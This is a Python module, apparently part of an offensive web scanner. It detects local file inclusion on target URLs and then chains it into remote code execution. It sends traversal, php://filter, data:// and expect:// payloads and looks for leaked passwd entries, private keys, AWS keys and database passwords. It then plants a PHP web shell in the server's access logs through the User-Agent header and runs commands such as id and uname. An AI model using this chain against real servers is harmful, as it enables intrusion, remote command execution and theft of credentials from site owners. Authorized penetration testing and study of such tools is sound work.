"""lfi — LFI scanner + log-poisoning RCE chain (v3)"""
import re, os
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.http import HttpClient
from core.payloads import get

MARKERS = [
    "root:x:0:0","daemon:x:","bin:x:","[fonts]","[extensions]",
    "for 16-bit app support","DOCUMENT_ROOT=","HTTP_USER_AGENT=",
    "REMOTE_ADDR=","-----BEGIN RSA PRIVATE KEY-----",
    "-----BEGIN OPENSSH PRIVATE KEY-----","AWS_ACCESS_KEY_ID",
    "DB_PASSWORD=","SECRET_KEY=","localhost:3306","127.0.0.1:6379",
]

LOG_PATHS = [
    "/var/log/apache2/access.log","/var/log/apache2/error.log",
    "/var/log/httpd/access_log","/var/log/httpd/error_log",
    "/var/log/nginx/access.log","/var/log/nginx/error.log",
    "/var/log/auth.log","/var/log/secure","/var/log/syslog","/var/log/messages",
    "/proc/self/environ","/proc/self/cmdline",
    "/var/log/vsftpd.log","/var/log/sshd.log",
]

PHP_FILTERS = [
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/read=convert.base64-encode/resource=../config.php",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
    "expect://id",
]

class Lfi:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)
        u = urlparse(target)
        params = parse_qs(u.query) or {"file": ["index"], "page": ["home"]}

        base_payloads = get("lfi", limit=250, mutate_by=0)
        all_payloads = base_payloads + PHP_FILTERS + LOG_PATHS
        print(f"[lfi] {len(all_payloads)} payloads")

        findings = []
        vuln_param = None

        for name in params:
            for p in all_payloads:
                r = http.get(self._url(u, params, name, p))
                if not r: continue
                for m in MARKERS:
                    if m in r.text:
                        findings.append({"param":name,"payload":p,"marker":m})
                        print(f"  [!] LFI: {name}={p[:60]} -> {m}")
                        logger.finding("lfi","critical",f"{name}={p[:60]} marker={m}")
                        vuln_param = name
                        break
                # php base64 filter
                if "php://filter" in p and r.status_code == 200:
                    b64 = re.findall(r"[A-Za-z0-9+/]{100,}={0,2}", r.text)
                    if b64:
                        findings.append({"param":name,"payload":p,"type":"php_filter"})
                        logger.finding("lfi_php_filter","high",f"{name} base64 output")
                        print(f"  [+] php filter output ({len(b64[0])} chars)")
                        vuln_param = name
                if len(findings) > 25: break
            if findings: break

        print(f"[lfi] done: {len(findings)}")

        # CHAIN: log poisoning → RCE
        if vuln_param:
            print(f"\n[lfi] attempting log-poisoning → RCE on {vuln_param}")
            self._log_poison_rce(http, u, params, vuln_param, logger)

        return {"findings": findings, "param": vuln_param}

    def _log_poison_rce(self, http, u, params, param, logger):
        """Send PHP payload in UA, then LFI logs → check if executed"""
        marker = "OMNI_LFI_RCE_7x9z"
        php = f"<?php echo '{marker}'; system($_GET['c']); ?>"
        http.get(session_target_dummy := u.geturl(), headers={"User-Agent": php})

        common_logs = [p for p in LOG_PATHS if "log" in p and "access" in p][:5]
        for lp in common_logs:
            payload = f"../../../../..{lp}" if not lp.startswith("..") else lp
            r = http.get(self._url(u, params, param, payload))
            if r and (php in r.text or marker in r.text):
                print(f"  [!] LOG POISONING: {lp} contains our PHP")
                logger.finding("lfi_log_poison","critical",f"UA reflected in {lp}")

                # try command execution
                for cmd in ["id","whoami","uname -a","ls -la /"]:
                    test = self._url(u, params, param, payload) + f"&c={cmd}"
                    r2 = http.get(test)
                    if r2 and ("uid=" in r2.text or "root" in r2.text or cmd.split()[0] in r2.text):
                        print(f"      [RCE] c={cmd}: {r2.text[:100].strip()}")
                        logger.finding("lfi_rce","critical",f"RCE via {lp}: {cmd}")
                return
        print("  log poisoning: no reflected UA in logs")

    def _url(self, u, params, name, payload):
        q = dict(params); q[name] = [payload]
        return urlunparse(u._replace(query=urlencode(q, doseq=True)))
